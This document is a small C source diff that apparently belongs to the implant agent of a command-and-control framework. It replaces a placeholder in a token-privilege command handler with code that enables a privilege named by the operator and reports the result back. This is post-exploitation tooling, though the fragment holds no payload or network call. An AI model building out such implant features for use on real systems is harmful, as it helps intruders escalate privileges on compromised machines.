@@ -1357,11 +1357,13 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )
         {
-            PTOKEN_PRIVILEGES TokenPrivs = NULL;
-            DWORD             TPSize      = 0;
-            DWORD             Length      = 0;
-            HANDLE            TokenHandle = NULL;
-            BOOL              ListPrivs   = ParserGetInt32( Parser );
+            PTOKEN_PRIVILEGES TokenPrivs     = NULL;
+            DWORD             TPSize         = 0;
+            DWORD             Length         = 0;
+            HANDLE            TokenHandle    = NULL;
+            PCHAR             PrivName       = NULL;
+            DWORD             PrivNameLength = 0;
+            BOOL              ListPrivs      = ParserGetInt32( Parser );
 
             PackageAddInt32( Package, ListPrivs );
 
@@ -1392,7 +1394,10 @@ VOID CommandToken( PPARSER Parser )
             else
             {
                 PUTS( "Privs::Get" )
-                /* TODO: implement */
+                PrivName = ParserGetBytes( Parser, &PrivNameLength );
+
+                PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
+                PackageAddBytes( Package, PrivName, PrivNameLength );
             }
 
             if ( TokenPrivs )
